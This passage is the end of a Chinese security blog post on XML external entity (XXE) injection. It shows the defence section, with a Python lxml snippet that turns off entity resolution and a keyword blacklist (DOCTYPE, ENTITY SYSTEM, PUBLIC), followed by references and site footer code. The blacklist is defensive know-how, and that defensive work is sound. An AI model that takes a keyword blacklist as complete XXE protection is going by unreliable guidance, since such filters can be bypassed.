+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="keyword">False</span>))</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>手动黑名单过滤</p>
+<p>过滤关键词</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOCTYPE、ENTITY SYSTEM、PUBLIC</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>下次利用具体例子进行演示。</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol>
+<li>一篇文章带你深入理解漏洞之 XXE 漏洞 <a href="https://xz.aliyun.com/t/3357#toc-26" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-26</a></li>
+<li>浅谈XXE漏洞攻击与防御  <a href="https://thief.one/2017/06/20/1/" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/</a></li>
+<li>未知攻焉知防——XXE漏洞攻防 <a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></li>
+</ol>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XML基础"><span class="toc-number">1.</span> <span class="toc-text">XML基础</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XML声明"><span class="toc-number">1.1.</span> <span class="toc-text">XML声明</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DTD文档类型定义"><span class="toc-number">1.2.</span> <span class="toc-text">DTD文档类型定义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#实体"><span class="toc-number">1.3.</span> <span class="toc-text">实体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE"><span class="toc-number">2.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#引用外部实体方式"><span class="toc-number">2.1.</span> <span class="toc-text">引用外部实体方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用"><span class="toc-number">2.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#防御"><span class="toc-number">2.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&text=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&is_video=false&description=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透技术基础之XML外部实体注入（XXE）解析&body=Check out this article: https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&title=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&name=渗透技术基础之XML外部实体注入（XXE）解析&description=&lt;p&gt;XXE漏洞(XML External Entity Injection)，XML外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，攻击者可以通过 XML 实体传递自己构造的恶意值，通过加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内部网站、发起dos攻击等危害。&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://sy-yunyi.github.io/2019/05/15/渗透技术基础之XML外部实体注入（XXE）解析/&t=渗透技术基础之XML外部实体注入（XXE）解析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Six
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://www.yuque.com/u447199">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
